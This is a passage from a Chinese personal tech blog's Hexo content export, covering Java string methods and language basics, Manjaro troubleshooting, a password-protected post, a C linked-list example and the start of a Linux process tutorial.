class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">String str2 = <span class="keyword">new</span> String(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">System.out.println(str1==str2);</span><br></pre></td></tr></table></figure><p>结果是<code>false</code></p><p>为什么？</p><p>看图：</p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/字符串new存储方式.png" alt="字符串new存储方式" style="zoom:50%;" /><p>2.<code>s.equals(String str);</code></p><p>功能：直接查看字符是否相同</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">String str2 = <span class="keyword">new</span> String(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">System.out.println(str1.equals(str2));</span><br></pre></td></tr></table></figure><p>3.<code>s.equalsIgnoreCase(String str);</code></p><p>功能：忽略大小写</p><p>4.<code>s.compareTo(String str);</code></p><p>功能：比较字符串的大小，通过索引一个一个字符的比较，相同则跳过，遇到不同则返回差值，若s与str前面几个字符相同后面不同则返回字符串长度的差值</p><h4 id="含某子字符串"><a href="#含某子字符串" class="headerlink" title="含某子字符串"></a>含某子字符串</h4><p><code>s.contains(String str)</code></p><h4 id="空字符串"><a href="#空字符串" class="headerlink" title="空字符串"></a>空字符串</h4><p><code>s.isEmpty</code></p><p>空的状态</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String s1 = <span class="string">&quot;&quot;</span>;<span class="comment">//空指针</span></span><br><span class="line">String s2 = <span class="keyword">null</span>;<span class="comment">//空对象</span></span><br></pre></td></tr></table></figure><h3 id="转换操作"><a href="#转换操作" class="headerlink" title="转换操作"></a>转换操作</h3><p>操作都不会改变原有字符串，会创建新的字符串</p><h4 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h4><p><code>s.toLowerCase(String str)</code></p><p><code>s.toUpperCase(String str)</code></p><h4 id="除去首尾空格"><a href="#除去首尾空格" class="headerlink" title="除去首尾空格"></a>除去首尾空格</h4><p><code>s.trim(String str)</code></p><h4 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h4><p><code>s.replace(old str,new str)</code></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java基础</title>
      <link href="/Programming/Java/day1_%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html"/>
      <url>/Programming/Java/day1_%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html</url>
      
        <content type="html"><![CDATA[<p>Java是一门面向对象编 程语言，具有简单性、面向对象、<a href="https://baike.baidu.com/item/分布式/19276232">分布式</a>、<a href="https://baike.baidu.com/item/健壮性/4430133">健壮性</a>、<a href="https://baike.baidu.com/item/安全性/7664678">安全性</a>、平台独立与可移植性、<a href="https://baike.baidu.com/item/多线程/1190404">多线程</a>、动态性等特点 。Java可以编写<a href="https://baike.baidu.com/item/桌面应用程序/2331979">桌面应用程序</a>、<a href="https://baike.baidu.com/item/Web应用程序">Web应用程序</a>、<a href="https://baike.baidu.com/item/分布式系统/4905336">分布式系统</a>和<a href="https://baike.baidu.com/item/嵌入式系统/186978">嵌入式系统</a>应用程序等  。</p><span id="more"></span><h3 id="跨平台"><a href="#跨平台" class="headerlink" title="跨平台"></a>跨平台</h3><p>开发出来的项目可以在各个操作系统上执行，而不需要针对操作系统单独开发，原因就是Java有一个解释器，JVM(Java Virtual Machine)</p><h3 id="运行原理"><a href="#运行原理" class="headerlink" title="运行原理"></a>运行原理</h3><p><code>.java</code>编译出字节码程序<code>.class</code>，通过JVM在操作系统上运行，所以每个操作系统有不同的JVM</p><h3 id="JDK和JRE"><a href="#JDK和JRE" class="headerlink" title="JDK和JRE"></a>JDK和JRE</h3><p>JRE(Java Runtime Environment)也就是java运行环境，JDK(Java Development Kit)也就是Java开发工具包，jdk里面有jre，百度下载安装就可以开始编程了</p><h2 id="环境变量配置"><a href="#环境变量配置" class="headerlink" title="环境变量配置"></a>环境变量配置</h2><p>JDK安装后，路径下u有个<code>bin</code>，<code>javac</code>、<code>java</code>等编译运行指令都在这个目录，如果不想每次编译都输入很长的命令就把它设置到环境变量吧，win10找到path添加绝对路径，linux可以在/etc/profile、<del>/.bashrc、\</del>/.bash_profile里面添加<code>PATH=&quot;$&#123;PATH&#125;:你jdk的bin存放的绝对路径&quot;</code>，重新打开一个shell就有了</p><p>注意新增一个变量classpath，设置路径后，就可以在任意地方运行你的java程序了</p><h2 id="Java标识符"><a href="#Java标识符" class="headerlink" title="Java标识符"></a>Java标识符</h2><p>1.由字母，数字，<code>_$</code>组成</p><p>2.不能以数字开头</p><p>3.<strong>不能是Java关键字</strong></p><p>4.区分大小写</p><p>5.最好遵循陀峰命名法</p><ul><li>类名首字母大写，其他首字母小写</li></ul><p>6.<strong>不能有空格</strong></p><h2 id="java语言类型"><a href="#java语言类型" class="headerlink" title="java语言类型"></a>java语言类型</h2><h3 id="基本数据类型-Primitive-Type"><a href="#基本数据类型-Primitive-Type" class="headerlink" title="基本数据类型(Primitive Type)"></a>基本数据类型(Primitive Type)</h3><p>1.数值类型</p><ul><li>整数类型<ul><li>byte:占1字节</li><li>short:占2字节</li><li>int:占4字节</li><li>long:占8字节</li></ul></li><li>浮点类型<ul><li>double：8字节</li><li>float：4字节</li></ul></li><li>字符类型<ul><li>chat：2字节</li></ul></li></ul><p>2.boolean类型</p><ul><li>占1位，只有false和true两个值</li></ul><blockquote><p>需要特别注意的就是整数默认是int型，浮点数默认是double型，赋给其他类型时记得手动转换类型，不然编译会报错</p><p>但是short和byte如果在数据范围内的话不会报错，而且也不用手动转换类型</p></blockquote><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DataType</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">byte</span> a   = <span class="number">1000</span>;</span><br><span class="line">                <span class="keyword">long</span> b   = <span class="number">10000l</span>;</span><br><span class="line">                <span class="keyword">float</span> c  = <span class="number">1.3f</span>;</span><br><span class="line">                <span class="keyword">double</span> d = <span class="number">5.3</span>;</span><br><span class="line"></span><br><span class="line">                System.out.println(a);</span><br><span class="line">            System.out.println(b);</span><br><span class="line">            System.out.println(c);</span><br><span class="line">            System.out.println(d);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="引用数据类型-Reference-Type"><a href="#引用数据类型-Reference-Type" class="headerlink" title="引用数据类型(Reference Type)"></a>引用数据类型(Reference Type)</h3><p>1.类</p><p>2.接口</p><p>3.数组</p><blockquote><p>需要注意的是字符串类型也是一个类，也属于引用数据类型</p></blockquote><h3 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h3><ul><li><p>定义变量格式</p><p><code>数据类型 变量名 = value</code></p></li><li><p>定义常量格式</p><p><code>final 数据类型 常量名  = value</code></p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>定义long和float时，数字末尾加上l和f，大小写随意</li><li>char可以存储汉字，因为他占2字节，汉字也占两个字节</li></ul><blockquote><p>正数采用二进制源码存储</p><p>负数采用补码存储</p></blockquote><h2 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h2><p>1.符号：<code>* / + - %</code></p><p>2.规则：<code>操作数1 运算符 操作数2</code></p><p>运算的特例</p><ul><li>使用浮点数时，数据不会精确</li><li>使用<code>+</code>可以对字符串进行组拼<ul><li><code>hello&quot;+&quot;world&quot; ==&gt; &quot;helloworld&quot;</code></li><li><code>&quot;44&quot;+44 ==&gt; &quot;4444&quot;</code></li><li><code>&quot;hello&quot;+44 ==&gt; &quot;hello44&quot;</code></li><li><code>&quot;hello&quot;+&#39;a&#39; ==&gt; &quot;helloa&quot;</code></li><li>使用单个字符时，会把字符转换成数字在进行运算</li></ul></li></ul><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p>符号：<code>= += -= *= /= %=</code></p><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>符号：<code>&lt; &gt; &lt;= &gt;= == !=</code></p><p>返回结果：boolean值<code>true</code>或<code>false</code></p><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>符号：</p><ul><li><code>||</code>短路或：也就是说boolean1为true，则boolean2不用算直接得结果</li><li><code>&amp;&amp;</code>短路与</li><li><code>！</code></li><li><code>^</code>异或：结果不一样返回true</li><li><code>&amp;</code>与：不管boolean1的true和false，boolean2也会计算</li><li><code>|</code>或</li></ul><p>规则：<code>boolean1 逻辑运算符 boolean2</code></p><p>注意：<code>1&lt;=x&lt;=2</code>是错误的写法</p><h2 id="按位"><a href="#按位" class="headerlink" title="按位"></a>按位</h2><ul><li><code>&amp;</code>按位与</li><li><code>|</code>按位或</li><li><code>~</code></li><li><code>^</code>按位异或</li></ul><h2 id="移位"><a href="#移位" class="headerlink" title="移位"></a>移位</h2><ul><li><code>&gt;&gt;</code>右移，高位用符号位填充</li><li><code>&lt;&lt;</code>左移，低位0填充</li><li><code>&gt;&gt;&gt;</code>无符号右移，高位0填充，低位丢弃</li></ul><h2 id="三元运算"><a href="#三元运算" class="headerlink" title="三元运算"></a>三元运算</h2><p>规则：<code>布尔表达式?表达式1:表达式2</code></p><p><code>true</code>使用表达式1</p><p><code>false</code>使用表达式2</p><blockquote><p>表达式不能是赋值语句</p></blockquote><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TernaryOpretor</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">System.out.println(<span class="number">8</span>&gt;<span class="number">9</span>?<span class="string">&quot;正确&quot;</span>:<span class="string">&quot;错误&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><h3 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h3><p>数值在赋值和运算时会自动转换类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span> a=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">float</span> b;</span><br><span class="line">b = a;</span><br></pre></td></tr></table></figure><p>a就会变为<code>float</code>型</p><h3 id="显式类型转换"><a href="#显式类型转换" class="headerlink" title="显式类型转换"></a>显式类型转换</h3><p>自己转换类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">float</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">byte</span> b = (<span class="keyword">byte</span>)a;</span><br></pre></td></tr></table></figure><p>如果不转换类型的话会报错</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装Manjaro疑难杂症</title>
      <link href="/TechnicalExperience/Linux/Manjaro-problems.html"/>
      <url>/TechnicalExperience/Linux/Manjaro-problems.html</url>
      
        <content type="html"><![CDATA[<p>装Manjaro时遇到的一些问题</p><span id="more"></span><p>1.在分区时将/usr独立，导致开机启动提示/sbin/init does not exist，并且啥也不能输入，原因我还没弄懂</p><p>2.进入系统后，将亮度条拉到最低，最想不到的事出现了，黑屏（纯黑），我的电脑屏幕可不是A屏，我没想到这kde的开发者怎么坑，竟然把亮度最低弄到了黑屏QWQ，废了半天，终于找到了解决办法：</p><ul><li>查了下官方文档，只能得到配置文件到家目录下的.config里</li><li>没多余的linux系统，我找到了我的U盘，插上进入shell挂载我的家目录进行除错</li><li>最开始我是在.config找kde开头的文件，emm只有两个，看了下没一个像亮度的</li><li>然后我仔细想了想，最开始用manjaro的时候，我一直没找到亮度条，原因就是它并不在显示里面，而是在电源管理里面，于是我换目标，找power开头的文件</li><li>我找到了里面的powermanagementprofilesrc(乖乖，名字真长)，看到brightness control，那一刻我感觉我看了上帝，看到设置值，果然是0，我改成10重启，终于看到了我熟悉的桌面QAQ</li></ul>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 系统优化 </tag>
            
            <tag> 装系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态</title>
      <link href="/Life/zone.html"/>
      <url>/Life/zone.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不好意思，密码没对哦，在检查检查呢！" data-whm="不好意思，信息无法验证！">  <script id="hbeData" type="hbeData" data-hmacdigest="53fcf0e13b4caece0532b005da99274a6bad66a45129ffda518b09eb5154faa4">7005d85bb8cab4279d15ba3b37c792f8336fe691b89dd17de1e54e92364e6ed52e56b4d91bd9819346e145639251ff52491931be3bf05c748b7358772dddbc61eb49b50a58cae451cfb8eb88aee09777c26af3ebef78b53bcb0915850d46127c139b75306d1f20bc13fab1985c653e1b9097a2ee72fef2f2525bd62eb66e6c45cbbd8394ad45d6568dc8d15c83dfeaa89712847c052dc78e9ee205f30aa225e7d1e9cb88e7323de77046da03102580b48d954dba5c7b625f9043e981d93edd12544cd4fecada749719e6fd612b7aec81a126249cd1c61d8516475f04a3c6e40abc4954796b901ae14828ca3d09500d41d7bd9862c7b6c23a5b27dbe39f5c7aad621ef887d66017e9c2ddd1ff336294e14ed5380e8dc9baee50b5b23c712a5a35cd40b45204f3d5e0e7fa45756096dc5d9fc2cd37a926b568827ce100ac455214b3fd3b9e0297e23ea30d481866eb4239fb39c22143560d160297838bd4dc9883ef4daa9c971ed1d99843e4ec6c76a05181315fb608911086e338f56dfa919bd18dfce1f847d35090f94dfd4fe218e1642568397718b917c6cce78ba096ca4ccfd9ea5b5c32c69bddc7ac140cc4cbdad9e4bda41f3bf8133bcffcff35b700fa533f6a1ca391b32ec64c1ba5a71d18b978423cea91885a62c724ecd49c51eaf635ffb1f5cb481e44b422eebb068f1f06236ebda9f868199c9825d62c896a5d958f2e92667089d787fc3b14ec27569d3fecb198096ae6c53f94d0b5ae97f4bc50d11a1d41d7210554029a9c3f3a0ee43d9bcb8904f8dd03db3843f3100b376768006d9ebabe8e4ed89bdee1ea8d2707f563b8e16ad3ebec2fab2f2eb1d918739750f0348199dcd655966c2196f093310fc98886b510b54457742df4cb5124b2b5078bd5a1ac7513b66b7792f0a9c0d719392e11aa76a57064388f7f5e5af55aca5d088d606ad5b17f987f255fa56fdc9343057d5c83b2605aa414cb1591d6d82f0a551d384206091a184a835fb9c4cf44e6cec59396a817e7db7663facc58e932f7346019735a664bded29916fbecc9e9d22de79266ae60eb41ba5b7b441c0208858c8b15f06bdf9a0f010e8c581239fa332b9365a6f17b64d95aaf849eb488476215d0daac24cbc1ab344a94a071518e52464576146621360caac2d8c047519d33737d89c74539cc0d50bc6e8d9e21f70d1ceed1616c2640764f0b26df6951729235857b7f6a25c9efd1b92faa9edc9c9370f1fcb1e26deb07bf10d40be32f0e622ad47d7222ac544f4803a487a2f934343bdd3956a613e3d4a29f3fd5c1477c9154c1dbf7a874a7544b46bfb2133b8f23ecf2220f1214089f414781ba35cb655eba52b624c376548ec192e01bd0f86a124a2c4c1b9756510eb39b3e19f3ee1c60b3f3c2631ff9f226f7cb14c23b29978d59511969cdceb81d35d72cb185112564e44c1f5073151a29fc154078d101f31d45bed50d14c186d3b97710dcfc44ee6d5922768132e76aada16f9f0ef071c42e383e49b5be186dfdd3e519d7dd4f5197e3ef864497482e8f693f5e300031022d94d2e131a47245a086f05f87e4411bfce704275de65fc8433658607c6936c52923751904bf070e8ef3f130335c78e2c3d52c05c477800e5e8330da4c8ab5c962a71f3e228ee59f927cb3b299c629efe0992b6c9c12eb77ed407fe17fe13fabe516fba83bb4974df1890c0739ed3529fd4a38d9256ec2ecf97a274800ff18f5e06070b281b7c9094fa4f3512bcc6b23a5dc35e6a8d4011b6ddffc47cfbe3cf64e1a2be492e424f4705094c75febc5711517c9b4fd068568cbb8214e5d4cc2fc7f3f66b615d289038e387634f93b66d5666a5b7c213a31a673b4e4475bbf18ff116bede34b2736818cfb595ea079e20d081a0bdab9b60a7fd440fd0f63e2314d8c685c0abb12e18ea7c18b38d241ac65a2818e33fe3c617c5fd4748967c32ed0cc3a75f83303c63442e1bca253256796173cdf0aa9c0410c6f7482b4c9afb310d94c46a1bfe2f2d92bcd874ea13ec1c62c4226237b22f6220206815fcdbc34bde7ab3ffd3db7fd7454c2bc3bfb1c656b7f4040bb1146fa625c93c2adb279f3699f37e409726d288371b6998568979fcfbaa20123ec888bb4b93c3a259751495de975f3c3d451104d27ed61f3717581fff6ee62b4eee72370968da09e9c7bf809a03bd5be2822c0524e61f4f3476b4838ea086baeeead4f4dc0f6294b38315fb45be5a4b948c1650b35c2c8d22f310974e96d0a40a0ef6af47bac6c4a6e25ab27445a6787a118ade3d1041632bce7acd89b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>链表</title>
      <link href="/Programming/C/%E9%93%BE%E8%A1%A8.html"/>
      <url>/Programming/C/%E9%93%BE%E8%A1%A8.html</url>
      
        <content type="html"><![CDATA[<p>参靠浙江大学翁凯老师的链表</p><span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; Link;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Link *head; </span><br><span class="line">    <span class="comment">// Link *tail;</span></span><br><span class="line">&#125; List;<span class="comment">//</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(List *pList, <span class="keyword">int</span> num)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(List <span class="built_in">list</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    List <span class="built_in">list</span>;</span><br><span class="line">    <span class="built_in">list</span>.head = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">        <span class="keyword">if</span>(num != <span class="number">-1</span>)&#123;</span><br><span class="line">            add(&amp;<span class="built_in">list</span>, num);<span class="comment">//add</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;list=%x\n&quot;</span>, <span class="built_in">list</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(num != <span class="number">-1</span>);</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">    print(<span class="built_in">list</span>);</span><br><span class="line"><span class="comment">//delete</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;delete\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">    Link *p;</span><br><span class="line">    <span class="keyword">int</span> isFound = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(p=<span class="built_in">list</span>.head; p; p=p-&gt;next)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;value == num) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;look!\n&quot;</span>);</span><br><span class="line">            isFound = <span class="number">0</span>;</span><br><span class="line">            Link *q=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">for</span>(p=<span class="built_in">list</span>.head; p; q=p, p=p-&gt;next)&#123;</span><br><span class="line">                <span class="keyword">if</span>( p-&gt;value == num ) &#123;</span><br><span class="line">                    <span class="keyword">if</span>( q )&#123;</span><br><span class="line">                        q-&gt;next = p-&gt;next;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="built_in">list</span>.head = p-&gt;next;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">free</span>(p);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;delete after:\n&quot;</span>);</span><br><span class="line">            print(<span class="built_in">list</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">if</span>( isFound ) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Not!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//remove:</span></span><br><span class="line">    Link *q=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span>( p=<span class="built_in">list</span>.head; p; p=q)&#123;</span><br><span class="line">        q = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;over!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(List *pList, <span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="comment">//add to linked-list</span></span><br><span class="line">    Link* p=(Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link));</span><br><span class="line">            p-&gt;value = num;</span><br><span class="line">            p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="comment">//find head</span></span><br><span class="line">            Link* last = pList-&gt;head;<span class="comment">//pHead-&gt;Link*</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;last=%x\n&quot;</span>, last);</span><br><span class="line">            <span class="keyword">if</span>(last)&#123;</span><br><span class="line">                <span class="keyword">while</span>(last-&gt;next)&#123;</span><br><span class="line">                    last = last-&gt;next;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;last=%x\n&quot;</span>, last);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//attach</span></span><br><span class="line">                last-&gt;next = p;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            pList-&gt;head = p;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//          return head;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(List <span class="built_in">list</span>)</span></span>&#123;</span><br><span class="line"><span class="comment">//遍历链表</span></span><br><span class="line">    Link* p;</span><br><span class="line">    <span class="keyword">for</span> (p=<span class="built_in">list</span>.head; p; p=p-&gt;next)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, p-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程</title>
      <link href="/Linux/%E8%BF%9B%E7%A8%8B.html"/>
      <url>/Linux/%E8%BF%9B%E7%A8%8B.html</url>
      
        <content type="html"><![CDATA[<p>触发一个事件时，系统都会把它定义为一个进程，给进程赋予一个<code>ID</code>，也就是<code>PID</code>，同时触发这个进程的用户与相关属性关系，给予<code>PID</code>一组有效的权限设置</p><span id="more"></span><h3 id="进程和程序"><a href="#进程和程序" class="headerlink" title="进程和程序"></a>进程和程序</h3><ul><li><p>程序都是二进制文件，执行一个程序（命令）就会产生一个进程，获得一个pid</p></li><li><p>程序有rwx三组权限，每个用户执行同一程序时所获得的权限是不一样的</p></li></ul><p>程序一般都放在物理磁盘里，通过用户执行后加载到内存中成为进程，进程会给予用户权限和属性等参数，以及进程需要的脚本或数据，在给一个PID，这个PID是根据用户的UID/GID而来的，相当于用户的权限，<strong>而由这个进程衍生出的其他进程在一般状态下也会沿用这个进程的相关权限</strong></p><h3 id="子进程与父进程"><a href="#子进程与父进程" class="headerlink" title="子进程与父进程"></a>子进程与父进程</h3><p>一个进程衍生出来的进程就叫子进程，这个进程就叫父进程，子进程会显示父进程的PID，也就是PPID（parent PID）</p><blockquote><p>实践：</p><p>在原有bash环境下执行<code>bash</code>，输入<code>ps -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@study ~ 21:20 <span class="comment">#19] # bash</span></span><br><span class="line">[root@study ~ 22:23 <span 